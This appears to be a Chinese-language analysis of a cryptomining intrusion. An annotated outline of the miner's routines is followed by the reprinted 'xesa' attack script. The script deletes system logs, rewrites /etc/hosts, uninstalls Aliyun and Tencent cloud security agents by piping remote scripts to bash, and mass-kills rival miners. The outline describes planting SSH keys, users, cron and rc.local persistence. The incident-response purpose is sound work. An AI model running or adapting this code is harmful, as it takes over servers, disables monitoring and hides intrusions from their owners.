usercheckgo           #增加sysall，system，logger，autoupdater4个用户，删除darmok，cokkokotre1，akay，o，phishl00t，opsecx12这个几个用户，这几个查了下都是挖矿同行
#fixgroupalreadyexists
#usercheckgo
#resetiptablespid
resetcron             #重置定时任务，死缠烂打，定时任务不删掉，一会又出来了
croncheckgo           #检查定时任务，如果没执行，就还会在/etc/cron.d 和/var/spool/cron继续增加
checkrc				  #检查rc.local，就是开机启动项，定时任务里下载的任务会放到开机启动项里，重启后，还会继续下载，如此重复循环
securitygo            #删除一些痕迹
iptableschecker       #防火墙放行他设置的一些ip
configfilecheck       #检查配置文件，如果有问题会继续下载
filerungo			  #检查挖矿bbb是否正常运行，反正如果不能正常运行，又开始折腾
addloggersshkey       #把自己的ssh-rsa加进来，这样就能直连了
addsystemsshkey       #同上
sshkeysgo             #同上
addautoupdatersshkey  #同上
#fixsystem            #这个是还原动过权限的文件，可以直接按他这个脚本恢复，这个不错
#fixlogger            #同上
successgo             #这个下载个什么文件，我删了，后面下不下来了
```

xesa脚本：
```
#!/bin/bash
#thanks for everything
#                                                                     $$\    $$$$$$\
#                                                                   $$$$ |  $$  __$$\
# $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\   $$$$$$$\        $$\   $$\ \_$$ |  \__/  $$ |
#$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ $$  _____|       \$$\ $$  |  $$ |   $$$$$$  |
#$$ /  $$ |$$ /  $$ |\$$$$$$\  $$$$$$$$ |$$ /              \$$$$  /   $$ |  $$  ____/
#$$ |  $$ |$$ |  $$ | \____$$\ $$   ____|$$ |              $$  $$<    $$ |  $$ |
#\$$$$$$  |$$$$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$$\        $$  /\$$\ $$$$$$\ $$$$$$$$\
# \______/ $$  ____/ \_______/  \_______| \_______|$$$$$$\\__/  \__|\______|\________|
#          $$ | pwning to pwn                      \______|
#          $$ | if this script helped you make some $$ mining monero, throw a little my way?
#          \__| Monero: 47TmDBB14HuY7xw55RqU27EfYyzfQGp6qKmfg6f445eihemFMn3xPhs8e1qM726pVj6XKtyQ1zqC24kqtv8fXkPZ7bvgSPU
#
#!/bin/sh
#crontab -r
initialrungo() {
  echo "initialrungo started"
  pkill -f swo
  pkill -f sic
  rm -rf /var/log/syslog
  chattr -iua /tmp/
  chattr -iua /var/tmp/
  #ufw disable;
  #iptables -F;
  cat /etc/hosts | grep -vw "grep" | grep "bigbotpein"
  if [ $? -eq 0 ]; then
    echo "good host"
  else
    echo "127.0.0.1 localhost" >>/etc/hosts
    echo "0.0.0.0 blockchain.info" >>/etc/hosts
    echo "0.0.0.0 100.100.25.3 jsrv.aegis.aliyun.com" >>/etc/hosts
    echo "0.0.0.0 100.100.25.4 update.aegis.aliyun.co" >>/etc/hosts
    echo "0.0.0.0 185.164.72.119" >>/etc/hosts
    echo "0.0.0.0 pinto.mamointernet.icu" >>/etc/hosts
    echo "0.0.0.0 lsd.systemten.org" >>/etc/hosts
    echo "0.0.0.0 ix.io" >>/etc/hosts
    echo '#fuck you bigbotpein boi" 205.185.113.35"' >>/etc/hosts
    echo "0.0.0.0 205.185.113.35" >>/etc/hosts
    echo '#fuck you "sic"' >>/etc/hosts
  fi
  echo "nope" >/tmp/log_rot
  sudo sysctl kernel.nmi_watchdog=0
  echo '0' >/proc/sys/kernel/nmi_watchdog
  echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
  #userdel akay;
  #chattr -ia /etc/passwd;
  #chattr -ia /etc/shadow;
  #userdel -rf darmok;
  #userdel -rf cokkokotre1;
  #userdel -rf akay;
  #userdel -rf system;
  #chattr +ia /etc/passwd;
  #chattr +ia /etc/shadow;
  rm -rf /tmp/addres*
  rm -rf /tmp/walle*
  rm -rf /tmp/keys
  echo "initialrungo finished"
}

removealiyun() {
  echo "removealiyun started"
  if ps aux | grep -i '[a]liyun'; then
    curl http://update.aegis.aliyun.com/download/uninstall.sh | bash
    curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
    pkill aliyun-service
    rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
    rm -rf /usr/local/aegis*
    systemctl stop aliyun.service
    systemctl disable aliyun.service
  elif ps aux | grep -i '[y]unjing'; then
    /usr/local/qcloud/stargate/admin/uninstall.sh
    /usr/local/qcloud/YunJing/uninst.sh
    /usr/local/qcloud/monitor/barad/admin/uninstall.sh
  fi
  echo "removealiyun finished"
}

killeverything() {
  echo "killeverything started"
  netstat -anp | grep 185.71.65.238 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
  netstat -anp | grep 140.82.52.87 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
  netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  # Kills process related to port 23** ( so will kill dockerd)
  # netstat -anp | grep :23 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :143 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :2222 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :3333 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :3389 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :4444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :5555 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :6666 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :6665 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :6667 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :7777 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :8444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :14444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :14433 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :13531 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  echo "debug 0"
  ps aux | grep -vw bbb/bbb | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'bcm-agent' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep ':3333' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep ':5555' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'klogd' | awk '{print $2}' | xargs -I % kill -9 %
  echo "debug 0.5"
  #ps aux | grep -v grep | grep 'kworker -c\' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'curl -sL http://205.185.113.35' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'log_' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'systemten' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'netns' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'voltuned' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'darwin' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/dl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/ddg' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/pprt' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/ppol' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/65ccE*' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/jmx*' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/2Ne80*' | awk '{print $2}' | xargs -I % kill -9 %
  echo "debug 01"
  ps aux | grep -v grep | grep 'IOFoqIgyC0zmf2UR' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '45.76.122.92' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '51.38.191.178' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '51.15.56.161' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '86s.jpg' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'aGTSGJJp' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'nMrfmnRa' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'PuNY5tm2' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'I0r8Jyyt' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'AgdgACUD' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'uiZvwxG8' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'BtwXn5qH' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '3XEzey2T' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 't2tKrCSZ' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'HD7fcBgg' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'zXcDajSs' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '3lmigMo' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'AkMK4A2' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'AJ2AkKe' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'HiPxCJRS' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'http_0xCC030' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'http_0xCC031' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'http_0xCC032' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'http_0xCC033' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "C4iLM4L" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | awk '{ if(substr($11,1,2)=="./" && substr($12,1,2)=="./") print $2 }' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/boot/vmlinuz' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "i4b503a52cc5" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "dgqtrcst23rtdi3ldqk322j2" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "2g0uv7npuhrlatd" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "nqscheduler" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "rkebbwgqpl4npmm" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v aux | grep "]" | awk '$3>10.0{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "2fhtu70teuhtoh78jc5s" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "0kwti6ut420t" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "44ct7udt0patws3agkdfqnjm" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v "/" | grep -v "-" | grep -v "_" | awk 'length($11)>19{print $2}' | xargs -I % kill -9 %
  echo "debug 1"
  ps aux | grep -v grep | grep '\[^' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "rsync" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "watchd0g" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | egrep 'wnTKYg|2t3ik|qW3xT.2|ddg' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "158.69.133.18:8220" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "/tmp/java" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'gitee.com' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/java' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '104.248.4.162' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '89.35.39.78' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/dev/shm/z3.sh' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'kthrotlds' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'ksoftirqds' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'netdns' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'watchdogs' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v root | grep -v dblaunch | grep -v dblaunchs | grep -v dblaunched | grep -v apache2 | grep -v atd | awk '$3>10.0{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v aux | grep " ps" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "sync_supers" | cut -c 9-15 | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "cpuset" | cut -c 9-15 | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v aux | grep "x]" | awk '{print $2}' | xargs -I % kill -9 %
  echo "debug 2"
  ps aux | grep -v grep | grep -v aux | grep "sh] <" | awk '{print $2}' | xargs -I % kill -9 %
  echo "debug 3"
  ps aux | grep -v grep | grep -v aux | grep '\[]' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/l.sh' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/zmcat' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'CnzFVPLF' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'CvKzzZLs' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/udevd' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'KCBjdXJsIC1vIC0gaHR0cDovLzg5LjIyMS41Mi4xMjIvcy5zaCApIHwgYmFzaCA' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'Y3VybCAtcyBodHRwOi8vMTA3LjE3NC40Ny4xNTYvbXIuc2ggfCBiYXNoIC1zaAo' | awk '{print $2}' | xargs -I % kill -9 %
  echo "debug 3.1"
  ps aux | grep -v grep | grep 'sustse' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'sustse3' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '2mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '2mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'cr5.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'cr5.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'logo9.jpg' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'logo9.jpg' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  echo "debug 3.2"
  ps aux | grep -v grep | grep 'j2.conf' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'luk-cpu' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'luk-cpu' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'ficov' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'ficov' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'he.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'he.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'miner.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'miner.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'nullcrew' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  echo "debug 3.3"
  ps aux | grep -v grep | grep 'nullcrew' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '107.174.47.156' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '83.220.169.247' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '51.38.203.146' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '144.217.45.45' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '107.174.47.181' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '176.31.6.16' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '109.234.36.173' | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "mine.moneropool.com" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "pool.t00ls.ru" | awk '{print $2}' | xargs -I % kill -9 %
  echo "debug 3.4"
  ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:8080" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:3333" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "zhuabcn@yahoo.com" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "monerohash.com" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "/tmp/a7b104c270" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:6666" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:7777" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:443" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "stratum.f2pool.com:8888" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmrpool.eu" | awk '{print $2}' | xargs -I % kill -9 %
  echo "debug 3.5"
  ps auxf | grep xiaoyao | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep xiaoxue | awk '{print $2}' | xargs -I % kill -9 %
  echo "debug 4"
  netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
  netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
  pgrep -f monerohash | xargs -I % kill -9 %
  pgrep -f L2Jpbi9iYXN | xargs -I % kill -9 %
  pgrep -f xzpauectgr | xargs -I % kill -9 %
  pgrep -f slxfbkmxtd | xargs -I % kill -9 %
  pgrep -f mixtape | xargs -I % kill -9 %
  pgrep -f addnj | xargs -I % kill -9 %
  pgrep -f 200.68.17.196 | xargs -I % kill -9 %
  pgrep -f IyEvYmluL3NoCgpzUG | xargs -I % kill -9 %
  pgrep -f KHdnZXQgLXFPLSBodHRw | xargs -I % kill -9 %
  pgrep -f FEQ3eSp8omko5nx9e97hQ39NS3NMo6rxVQS3 | xargs -I % kill -9 %
  pgrep -f Y3VybCAxOTEuMTAxLjE4MC43Ni9saW4udHh0IHxzaAo | xargs -I % kill -9 %
  pgrep -f mwyumwdbpq.conf | xargs -I % kill -9 %
  pgrep -f honvbsasbf.conf | xargs -I % kill -9 %
  pgrep -f mqdsflm.cf | xargs -I % kill -9 %
  pgrep -f stratum | xargs -I % kill -9 %
  pgrep -f lower.sh | xargs -I % kill -9 %
  pgrep -f ./ppp | xargs -I % kill -9 %
  pgrep -f cryptonight | xargs -I % kill -9 %
  pgrep -f ./seervceaess | xargs -I % kill -9 %
  pgrep -f ./servceaess | xargs -I % kill -9 %
  pgrep -f ./servceas | xargs -I % kill -9 %
  pgrep -f ./servcesa | xargs -I % kill -9 %
  pgrep -f ./vsp | xargs -I % kill -9 %
  pgrep -f ./jvs | xargs -I % kill -9 %
  pgrep -f ./pvv | xargs -I % kill -9 %
  pgrep -f ./vpp | xargs -I % kill -9 %
  pgrep -f ./pces | xargs -I % kill -9 %
  pgrep -f ./rspce | xargs -I % kill -9 %
  pgrep -f ./haveged | xargs -I % kill -9 %
  pgrep -f ./jiba | xargs -I % kill -9 %
  pgrep -f ./watchbog | xargs -I % kill -9 %
  pgrep -f ./A7mA5gb | xargs -I % kill -9 %
  pgrep -f kacpi_svc | xargs -I % kill -9 %
  pgrep -f kswap_svc | xargs -I % kill -9 %
  pgrep -f kauditd_svc | xargs -I % kill -9 %
  pgrep -f kpsmoused_svc | xargs -I % kill -9 %
  pgrep -f kseriod_svc | xargs -I % kill -9 %
  pgrep -f kthreadd_svc | xargs -I % kill -9 %
  pgrep -f ksoftirqd_svc | xargs -I % kill -9 %
  pgrep -f kintegrityd_svc | xargs -I % kill -9 %
  pgrep -f jawa | xargs -I % kill -9 %
  pgrep -f oracle.jpg | xargs -I % kill -9 %
  pgrep -f 45cToD1FzkjAxHRBhYKKLg5utMGEN | xargs -I % kill -9 %
  pgrep -f 188.209.49.54 | xargs -I % kill -9 %
  pgrep -f 181.214.87.241 | xargs -I % kill -9 %
  pgrep -f etnkFgkKMumdqhrqxZ6729U7bY8pzRjYzGbXa5sDQ | xargs -I % kill -9 %
  pgrep -f 47TdedDgSXjZtJguKmYqha4sSrTvoPXnrYQEq2Lbj | xargs -I % kill -9 %
  pgrep -f etnkP9UjR55j9TKyiiXWiRELxTS51FjU9e1UapXyK | xargs -I % kill -9 %
  pgrep -f servim | xargs -I % kill -9 %
  pgrep -f kblockd_svc | xargs -I % kill -9 %
  pgrep -f native_svc | xargs -I % kill -9 %
  pgrep -f ynn | xargs -I % kill -9 %
  pgrep -f perl | xargs -I % kill -9 %
  pgrep -f 65ccEJ7 | xargs -I % kill -9 %
  pgrep -f jmxx | xargs -I % kill -9 %
  pgrep -f 2Ne80nA | xargs -I % kill -9 %
  pgrep -f sysstats | xargs -I % kill -9 %
  pgrep -f systemxlv | xargs -I % kill -9 %
  pgrep -f watchbog | xargs -I % kill -9 %
  pgrep -f OIcJi1m | xargs -I % kill -9 %
  pkill -f biosetjenkins
  pkill -f Loopback
  pkill -f apaceha
  pkill -f cryptonight
  pkill -f stratum
  pkill -f mixnerdx
  pkill -f performedl
  pkill -f JnKihGjn
  pkill -f irqba2anc1
  pkill -f irqba5xnc1
  pkill -f irqbnc1
  pkill -f ir29xc1
  pkill -f conns
  pkill -f irqbalance
  pkill -f crypto-pool
  pkill -f XJnRj
  pkill -f mgwsl
  pkill -f pythno
  pkill -f jweri
  pkill -f lx26
  pkill -f NXLAi
  pkill -f BI5zj
  pkill -f askdljlqw
  pkill -f minerd
  pkill -f minergate
  pkill -f Guard.sh
  pkill -f ysaydh
  pkill -f bonns
  pkill -f donns
  pkill -f kxjd
  pkill -f Duck.sh
  pkill -f bonn.sh
  pkill -f conn.sh
  pkill -f kworker34
  pkill -f kw.sh
  pkill -f pro.sh
  pkill -f polkitd
  pkill -f acpid
  pkill -f icb5o
  pkill -f nopxi
  pkill -f irqbalanc1
  pkill -f minerd
  pkill -f i586
  pkill -f gddr
  pkill -f mstxmr
  pkill -f ddg.2011
  pkill -f wnTKYg
  pkill -f deamon
  pkill -f disk_genius
  pkill -f sourplum
  pkill -f polkitd
  pkill -f nanoWatch
  pkill -f zigw
  pkill -f devtool
  pkill -f devtools
  pkill -f systemctI
  pkill -f watchbog
  pkill -f cryptonight
  pkill -f sustes
  pkill -f xmrig
  pkill -f xmrig-notls
  pkill -f xmr-stak
  pkill -f suppoie
  pkill -f zer0day.ru
  pkill -f dbus-daemon--system
  pkill -f nullcrew
  pkill -f systemctI
  pkill -f kworkerds
  pkill -f init10.cfg
  pkill -f /wl.conf
  pkill -f crond64
  pkill -f sustse
  pkill -f vmlinuz
  pkill -f exin
  pkill -f apachiii
  rm -rf /usr/bin/config.json
  rm -rf /usr/bin/exin
  killall log_rot
  pkill -f log_rot
  pkill -f sic
  kill -9 $(pgrep sic)
  rm -rf /tmp/wc.conf
  rm -rf /tmp/sic
  rm -rf /var/tmp/sic
  rm -rf /tmp/log_rot
  rm -rf /tmp/apachiii
  rm -rf /tmp/sustse
  rm -rf /tmp/php
  rm -rf /tmp/p2.conf
  rm -rf /tmp/pprt
  rm -rf /tmp/ppol
  rm -rf /tmp/javax/config.sh
  rm -rf /tmp/javax/bbb2
  rm -rf /tmp/.profile
  rm -rf /tmp/1.so
  rm -rf /tmp/kworkerds
  rm -rf /tmp/kworkerds3
  rm -rf /tmp/kworkerdssx
  rm -rf /tmp/xd.json
  rm -rf /tmp/syslogd
  rm -rf /tmp/syslogdb
  rm -rf /tmp/65ccEJ7
  rm -rf /tmp/jmxx
  rm -rf /tmp/2Ne80nA
  rm -rf /tmp/dl
  rm -rf /tmp/ddg
  rm -rf /tmp/lol/*
  chattr +iua /tmp/lol/
  chattr +iua /tmp/lol/*
  chattr +iua /tmp/sic/*
  chattr +iua /tmp/sic/
  chattr +iua /var/tmp/sic/
  chattr +iua /var/tmp/sic/*
  pkill sic
  rm -rf /tmp/systemxlv
  rm -rf /tmp/systemctI
  rm -rf /tmp/.abc
  rm -rf /tmp/osw.hb
  rm -rf /tmp/.tmpleve
  rm -rf /tmp/.tmpnewzz
  rm -rf /tmp/.java
  rm -rf /tmp/.omed
  rm -rf /tmp/.tmpc
  rm -rf /tmp/.tmpleve
  rm -rf /tmp/.tmpnewzz
  rm -rf /tmp/gates.lod
  rm -rf /tmp/conf.n
  rm -rf /tmp/update.sh
  rm -rf /tmp/devtool
  rm -rf /tmp/devtools
  rm -rf /tmp/fs
  rm -rf /tmp/.rod
  rm -rf /tmp/.rod.tgz
  rm -rf /tmp/.rod.tgz.1
  rm -rf /tmp/.rod.tgz.2
  rm -rf /tmp/.mer
  rm -rf /tmp/.mer.tgz
  rm -rf /tmp/.mer.tgz.1
  rm -rf /tmp/.hod
  rm -rf /tmp/.hod.tgz
  rm -rf /tmp/.hod.tgz.1
  rm -rf /tmp/84Onmce
  rm -rf /tmp/C4iLM4L
  rm -rf /tmp/lilpip
  rm -rf /tmp/3lmigMo
  rm -rf /tmp/am8jmBP
  rm -rf /tmp/tmp.txt
  rm -rf /tmp/baby
  rm -rf /tmp/.lib
  rm -rf /tmp/systemd
  rm -rf /tmp/lib.tar.gz
  rm -rf /tmp/baby
  rm -rf /tmp/java
  rm -rf /tmp/j2.conf
  rm -rf /tmp/.mynews1234
  rm -rf /tmp/a3e12d
  rm -rf /tmp/.pt
  rm -rf /tmp/.pt.tgz
  rm -rf /tmp/.pt.tgz.1
  rm -rf /tmp/go
  rm -rf /tmp/java
  rm -rf /tmp/j2.conf
  rm -rf /tmp/.tmpnewasss
  rm -rf /tmp/java
  rm -rf /tmp/go.sh
  rm -rf /tmp/go2.sh
  rm -rf /tmp/khugepageds
  rm -rf /tmp/.censusqqqqqqqqq
  rm -rf /tmp/.kerberods
  rm -rf /tmp/kerberods
  rm -rf /tmp/seasame
  rm -rf /tmp/touch
  rm -rf /tmp/.p
  rm -rf /tmp/runtime2.sh
  rm -rf /tmp/runtime.sh
